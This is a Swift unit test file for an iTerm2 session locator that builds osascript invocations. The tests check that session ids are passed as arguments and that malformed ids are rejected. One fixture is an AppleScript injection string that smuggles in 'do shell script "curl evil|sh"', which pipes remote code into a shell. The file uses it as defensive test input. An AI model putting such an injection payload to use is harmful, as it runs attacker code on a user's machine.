import XCTest
@testable import AgentPetCore

final class ITerm2LocatorTests: XCTestCase {
    func test_valid_ref_builds_parameterized_osascript_invocation() throws {
        let loc = ITerm2Locator()
        let ref = TerminalRef(kind: .iterm2, itermSessionId: "w0t1p0:ABCD-1234")
        let inv = try loc.focusInvocation(for: ref)
        XCTAssertEqual(inv.executable, "/usr/bin/osascript")
        // id 必须在 argv[1]，不是泛 contains（P0 精确断言）
        XCTAssertEqual(inv.arguments.count, 2)
        // 真机实测:iTerm2 AppleScript 的 `id of session` 返回纯 UUID,不含 wXtYpZ: 前缀;
        // 传完整环境变量形态永远匹配不上 → 误报「会话已关闭」。必须剥前缀取 UUID。
        XCTAssertEqual(inv.arguments[1], "ABCD-1234")
        // 脚本本体里不得出现被内插的 id
        let script = inv.arguments.first ?? ""
        XCTAssertFalse(script.contains("ABCD-1234"), "id 不得内插进脚本")
        XCTAssertTrue(script.contains("on run argv"))
    }

    func test_injection_attempt_in_ref_is_rejected() {
        let loc = ITerm2Locator()
        let evil = TerminalRef(kind: .iterm2,
            itermSessionId: "x\" \n do shell script \"curl evil|sh\" \n \"")
        XCTAssertThrowsError(try loc.focusInvocation(for: evil)) { err in
            XCTAssertEqual(err as? LocatorError, .invalidRef)
        }
    }

    func test_missing_iterm_session_id_throws() {
        let loc = ITerm2Locator()
        XCTAssertThrowsError(try loc.focusInvocation(for: TerminalRef(kind: .iterm2))) { err in
            XCTAssertEqual(err as? LocatorError, .missingRef)
        }
    }

    func test_capability_is_precise() {
        XCTAssertEqual(ITerm2Locator().capability, .precise)
        XCTAssertEqual(ITerm2Locator().kind, .iterm2)
    }

    /// H3-4: 脚本遍历完无 return 时触发 error，使 osascript 以非零退出（面板 H3-4）
    func test_script_contains_session_not_found_error() throws {
        let loc = ITerm2Locator()
        let ref = TerminalRef(kind: .iterm2, itermSessionId: "w0t1p0:ABCD-1234")
        let inv = try loc.focusInvocation(for: ref)
        let script = inv.arguments[0]
        XCTAssertTrue(script.contains("error"), "script must contain 'error' keyword")
        XCTAssertTrue(script.contains("session not found"), "script must contain 'session not found' message")
    }

    /// H3: 空串 itermSessionId → invalidRef（存在但非法，非 missingRef）
    func test_empty_id_throws_invalidRef() {
        let loc = ITerm2Locator()
        let ref = TerminalRef(kind: .iterm2, itermSessionId: "")
        XCTAssertThrowsError(try loc.focusInvocation(for: ref)) { err in
            XCTAssertEqual(err as? LocatorError, .invalidRef)
        }
    }

    func test_id_validator_rejects_quotes_spaces_newlines() {
        XCTAssertTrue(ITermSessionId.isValid("w0t1p0:ABCD-1234"))
        XCTAssertTrue(ITermSessionId.isValid("w0t1p0"))
        XCTAssertFalse(ITermSessionId.isValid("a b"))
        XCTAssertFalse(ITermSessionId.isValid("a\"b"))
        XCTAssertFalse(ITermSessionId.isValid("a\nb"))
        XCTAssertFalse(ITermSessionId.isValid(""))
        XCTAssertFalse(ITermSessionId.isValid("a$b"))
        XCTAssertFalse(ITermSessionId.isValid("a`b"))
        XCTAssertFalse(ITermSessionId.isValid("a;b"))
        XCTAssertFalse(ITermSessionId.isValid("a\\b"))
        XCTAssertFalse(ITermSessionId.isValid("a(b)"))
        XCTAssertFalse(ITermSessionId.isValid("a/b"))
        XCTAssertFalse(ITermSessionId.isValid("é"))   // 非 ASCII 字母现在也应被拒
    }

    func test_plainUUID_passedThrough() {
        // 无前缀(直接 UUID)也合法直通。
        let ref = TerminalRef(kind: .iterm2, itermSessionId: "ABCD-1234")
        let inv = try! ITerm2Locator().focusInvocation(for: ref)
        XCTAssertEqual(inv.arguments[1], "ABCD-1234")
    }
}
